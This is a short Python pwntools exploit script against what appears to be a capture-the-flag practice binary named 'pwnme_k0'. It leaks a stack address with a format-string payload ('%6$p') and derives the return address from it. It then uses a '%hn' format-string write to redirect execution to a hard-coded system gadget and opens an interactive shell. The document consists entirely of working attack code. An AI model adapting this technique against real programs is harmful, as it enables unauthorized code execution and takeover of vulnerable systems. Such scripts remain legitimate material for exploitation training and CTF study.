#!/usr/bin/env python
from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

p = process('./pwnme_k0')
elf = ELF('pwnme_k0')
# gdb.attach(p)

p.sendlineafter('Input your username(max lenth:20):', 'AAAAAAAA')
p.sendlineafter('Input your password(max lenth:20):', '%6$p')
p.sendlineafter('>', '1')
p.recvuntil('0x')
val_addr = int(p.recvline().strip(), 16)
ret_addr = val_addr - 0x38
log.success('val_addr = ' + hex(val_addr))
log.success('ret_addr = ' + hex(ret_addr))

system_addr = 0x4008A6
p.sendlineafter('>', '2')
p.sendlineafter('please input new username(max lenth:20):', p64(ret_addr))
p.sendlineafter('please input new password(max lenth:20):', '%2218d%8$hn')

p.sendlineafter('>', '1')
p.recv()
p.interactive()
